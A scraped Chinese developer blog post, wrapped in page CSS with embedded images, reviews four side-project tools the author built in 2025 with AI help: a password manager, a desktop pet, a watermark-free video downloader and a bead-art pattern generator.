SkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>年终倒计时的钟声已经敲响，刚好借这个节点，把2025年我折腾过的那些事儿一次性复盘。</p>
<p>这一年，我把 AI 当成副业合伙人，偷偷攒了 4 款小工具：</p>
<ul>
<li>密码管家——替你记住所有“记不住”的密码</li>
<li>桌面萌宠——电脑桌面添加一个桌宠</li>
<li>去水印下载鸭——一键解析某音、小某书、某手等主流的平台无水印视频、图片</li>
<li>小易拼豆——拼豆豆图纸生成器，手工圈的新外挂</li>
</ul>
<p>它们不是什么改变世界的核弹，却让我在下班后的 2 小时里，把兴趣写成了 1-3 行代码。</p>
<p><strong>密码管家</strong></p>
<p>上班以后，平台越攒越多，账号密码像野草一样疯长。每隔两周就要点一次“忘记密码”，验证码收得手软。</p>
<p>社区里的开源方案确实不少，但要么像 KeePass 那样需要折腾插件，要么像 Bitwarden 官方版一样占资源。我就想给“怕麻烦”的普通人做一只轻量小盒子——不装环境、不配数据库，甚至注册都不用。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862d125b921f4a07b797589de7a24d0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=2NYmauneUcgg8126Hddq4cQ4xpg%3D" alt="image.png" loading="lazy"/></p>
<p>代码已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCatsAndMice%2Fpassword%3Ftab%3Dreadme-ov-file" target="_blank" title="https://github.com/CatsAndMice/password?tab=readme-ov-file" ref="nofollow noopener noreferrer">github.com/CatsAndMice…</a></p>
<p>我自己还在日常用它，只是不再更新——零收入，用爱发电难长久，暂停维护算是对用户和自己都负责。</p>
<p><strong>桌面萌宠</strong></p>
<p>和密码管家一样，它也已停更，连我自己都不再投喂。</p>
<p>初衷很简单：在桌面塞一只2D面板娘，戳一戳会眨眼，能陪聊两句。</p>
<p>原计划再给她接个AI大脑，随口一句话就自动生成待办，结果受限于uTools插件框架，功能被框，折腾不动，热情不在了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59fb54301236413d98888e4f884c58a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=LZJFCqWfGvLPz4uB%2F2ppKvV7s%2F0%3D" alt="image.png" loading="lazy"/></p>
<p>代码已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCatsAndMice%2Futools-live2d" target="_blank" title="https://github.com/CatsAndMice/utools-live2d" ref="nofollow noopener noreferrer">github.com/CatsAndMice…</a></p>
<p><strong>去水印下载鸭</strong></p>
<p>这款工具诞生于今年国庆长假，它的功能是支持某音、小某书等平台视频、图片无水印下载</p>
<p>现在仍在持续运营，Web 端 + 小程序双端并行，随点随用。</p>
<p>体验地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fnologo.code24.top%2F" target="_blank" title="https://nologo.code24.top/" ref="nofollow noopener noreferrer">nologo.code24.top/</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8dcfa13e8bc4ee09d5e50df5fa72980~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=BxG6Cxe%2Bh%2BBZ1rZ5tirAPX3Vwew%3D" alt="image.png" loading="lazy"/></p>
<p>小程序端代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCatsAndMice%2Funi-nologo" target="_blank" title="https://github.com/CatsAndMice/uni-nologo" ref="nofollow noopener noreferrer">github.com/CatsAndMice…</a></p>
<p><strong>小易拼豆</strong></p>
<p>这款工具的灵感来自我女友。她想在电商平台上副业卖“拼豆豆”——一种把彩色塑料小豆子排成图案、再用熨斗烫成整片的解压手工。技术圈鲜有人听说，我干脆粘个视频链接，30 秒就能看懂它到底长啥样。<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1SUKBzREko%2F" target="_blank" title="https://www.bilibili.com/video/BV1SUKBzREko/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1SU…</a></p>
<p>拼豆豆的灵魂就是图纸——没有那张色块坐标，豆子再漂亮也只是散装彩虹，根本无从下手。</p>
<p>小易拼豆就是帮助用户自定义生成拼豆图纸。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b99d7b6ff37478089be9e4a984911df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=IrXq7GcG6CG5EMiIRXLhhUv%2BWUk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">总结</h2>
<p>今年把 AI 当合伙人，下班空闲时间内攒了 4 款小工具：密码管家替我告别“忘记密码”的循环；桌面萌宠让工位多了只会眨眼的 2D 同事；去水印下载鸭在国庆 7 天鏖战后依旧 7×24 待命；小易拼豆则把女友的副业灵感变成了手工圈的图纸外挂。</p>
<p>它们没掀起海啸，却让我第一次把“想法→代码→用户”的闭环跑通，收入有限，但至少把成本已收回。</p>
<p>希望明年我的代码能真正赚到钱，明年见。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>